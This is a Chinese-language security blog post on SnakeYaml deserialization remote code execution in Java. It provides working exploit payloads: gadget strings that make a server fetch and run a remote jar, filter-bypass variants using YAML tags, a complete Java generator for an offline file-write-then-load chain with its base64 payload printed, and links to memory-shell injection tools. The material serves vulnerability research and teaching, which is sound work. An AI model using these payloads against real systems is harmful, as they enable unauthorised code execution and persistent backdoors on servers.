title: java反序列化之SnakeYaml
author: bmth
tags:
  - 反序列化
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/d62fac81aabf497ca80d603a34f61652.png'
cover: 'https://img-blog.csdnimg.cn/d62fac81aabf497ca80d603a34f61652.png'
date: 2022-10-12 11:43:00
---
![](https://img-blog.csdnimg.cn/d62fac81aabf497ca80d603a34f61652.png)

## SnakeYaml
SnakeYaml包主要用来解析yaml格式的内容，yaml语言比普通的xml与properties等配置文件的可读性更高，像是Spring系列就支持yaml的配置文件，而SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型

YAML基本格式要求：
1. YAML大小写敏感
2. 使用缩进代表层级关系
3. 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐(一般2个或4个空格)


导入依赖jar包
```
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

### 反序列化
SnakeYaml提供了`Yaml.dump()`和`Yaml.load()`两个函数对yaml格式的数据进行序列化和反序列化：
- Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象
- Yaml.dump()：将一个对象转化为yaml文件形式

首先一个User类：
```java
package SnakeYaml;

public class User {

    String name;
    int age;

    public User() {
        System.out.println("User构造函数");
    }

    public String getName() {
        System.out.println("User.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("User.setName");
        this.name = name;
    }

    public String getAge() {
        System.out.println("User.getAge");
        return name;
    }

    public void setAge(String name) {
        System.out.println("User.setAge");
        this.name = name;
    }

}
```
然后进行一波反序列化
```java
String s = "!!SnakeYaml.User {name: Tom, age: 18}";
Yaml yaml = new Yaml();
User user = yaml.load(s);
```
![](https://img-blog.csdnimg.cn/e2b44026bafb44b981ffe09700dd9583.png)

**反序列化过程中会触发set方法和构造方法**
### 漏洞复现
>影响版本
全版本

yaml反序列化时可以通过`!!`+全类名指定反序列化的类，反序列化过程中会实例化该类，构造`ScriptEngineManager`并利用SPI机制，通过`URLClassLoader`，或者其他payload如`JNDI`方式远程加载实例化恶意类从而实现任意代码执行




工具链接：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)
![](https://img-blog.csdnimg.cn/1837f21e2d614d21a12639b9cb10a1ec.png)

也可以写个自定义的ClassLoader然后通过defineClass加载 bytecode的base64字符串达到打内存马的一个目的
```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
进行编译，用python开一个web服务，然后进行反序列化
```java
String context = "!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]";

Yaml yaml = new Yaml();
yaml.load(context);
```
成功弹出计算器
![](https://img-blog.csdnimg.cn/703a25589d4a463a8608d8dd237d2b40.png)
假如说`!!`被过滤了，那么我们可以使用浅蓝师傅的trick：[SnakeYaml 反序列化的一个小 trick](https://b1ue.cn/archives/407.html)
每个`!!`修饰过的类都转成了一个 TAG
>第一种是用`!<TAG>`来表示，只需要一个感叹号，尖括号里就是 TAG
>第二种，需要在 yaml 中用`%TAG`声明一个 TAG 

exp：
```java
String pass1 = "!<tag:yaml.org,2002:javax.script.ScriptEngineManager> [!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL> [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]";

String pass2 = "%TAG !      tag:yaml.org,2002:\n" +
                "---\n" +
                "!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]";
```


参考：
[SnakeYAML反序列化及可利用Gadget](https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90)
[Java SnakeYaml反序列化漏洞](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
[Java安全之SnakeYaml反序列化分析](https://tttang.com/archive/1591)

### 不出网RCE
#### 写文件并加载jar包
通过改写`fastjson 1.2.68`写文件的链和ScriptManager本地加载jar包的方式 仅需依赖jdk就可以完成RCE

思路很巧妙，而且也很实用
```java
package SnakeYaml;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.Base64;
import java.util.zip.Deflater;

public class SnakeYamlOffInternet {
    public static void main(String [] args) throws Exception {
        String poc = createPoC("./src/main/java/SnakeYaml/calc-payload.jar","./src/main/java/SnakeYaml/yaml-payload.txt");
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }

    public static String createPoC(String SrcPath,String Destpath) throws Exception {
        File file = new File(SrcPath);
        Long FileLength = file.length();
        byte[] FileContent = new byte[FileLength.intValue()];
        try{
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        }
        catch (FileNotFoundException e){
            e.printStackTrace();
        }
        byte[] compressbytes = compress(FileContent);
        String base64str = Base64.getEncoder().encodeToString(compressbytes);
        String poc = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\""+Destpath+"\"],false],!!java.util.zip.Inflater  { input: !!binary "+base64str+" },1048576]]";
        System.out.println(poc);
        return poc;
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return output;
    }
}
```
生成exp，然后执行写入文件
```
!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["./src/main/java/SnakeYaml/yaml-payload.txt"],false],!!java.util.zip.Inflater  { input: !!binary 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 },1048576]]
```
最后使用file协议即可rce

![](https://img-blog.csdnimg.cn/b05be3b282864a70a7eb7f566b27d536.png)
成功执行命令

参考：
[SnakeYaml 之不出网RCE](https://xz.aliyun.com/t/10655)
#### 写入内存马
不出网的话我们就无法反弹shell，需要写入内存马来得到命令执行的回显，这里是Springboot环境下的，由于加载jar包时会新建线程，故无法通过常规方法获取应用上下文，并且存在不同类加载器强制转换问题

通过Springboot内置TomcatClassLoader跨线程注入拦截器型内存马

直接使用工具即可：[https://github.com/passer-W/snakeyaml-memshell](https://github.com/passer-W/snakeyaml-memshell)
![](https://img-blog.csdnimg.cn/38abee1fbdd347e3be766207e143f842.png)
参考：
[springboot snakeyaml利用浅析 ](https://xz.aliyun.com/t/11208)
[RuoYi 可用内存马](https://xz.aliyun.com/t/10651)
